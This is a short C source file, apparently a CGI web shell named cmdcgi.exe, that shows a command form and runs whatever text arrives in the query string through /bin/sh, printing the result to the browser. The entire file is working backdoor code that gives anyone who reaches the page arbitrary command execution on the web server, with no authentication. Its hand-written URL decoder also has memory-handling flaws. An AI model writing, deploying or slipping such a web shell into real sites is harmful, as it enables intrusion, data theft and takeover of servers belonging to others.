//
// cmdcgi.exe 0.1 darkraver (12/05/2005)
//

#include <stdio.h>


char *uri_decode(char *uri) {
  int i=0;
  int ptr=0;
  char *command;
  char hexa[3];
  char code;

  command=(char *)malloc(strlen(uri));

  for(i=0;i<strlen(uri);i++) {

    switch(*(uri+i)) {
      case '+':
        *(command+ptr)=' ';
        ptr++;
        break;
      case '%':
        sprintf(hexa, "%c%c\x00", *(uri+i+1), *(uri+i+2));
        i+=2;
        //printf("HEXA: %s\n", hexa);
        sscanf(hexa, "%x", &code);
        //printf("CODE: %c\n", code);
        *(command+ptr)=code;
        ptr++;
        break;
      default:
        *(command+ptr)=*(uri+i);
        ptr++;
        break;
      }

    }

  *(command+ptr)='\0';

  return command;

}


int main(int argc, char **argv) {
  char *cmd;

  printf("Content-type: text/html\n\n");
  printf("<html><body>\n");

  cmd=(char *)getenv("QUERY_STRING");

  if(!cmd || strlen(cmd)==0) {
    printf("<hr><p><form method=\"GET\" name=\"myform\" action=\"\">");
    printf("<input type=\"text\" name=\"cmd\">");
    printf("<input type=\"submit\" value=\"Send\">");
    printf("<br><br><hr></form>");
    } else {
    //printf("QUERY_STRING: %s\n", cmd);
    cmd+=4;
    cmd=uri_decode(cmd);
    printf("<hr><p><b>COMMAND: %s</b><br><br><hr><pre>\n", cmd);
    fflush(stdout);
    execl("/bin/sh", "/bin/sh", "-c", cmd, 0);
    }

}




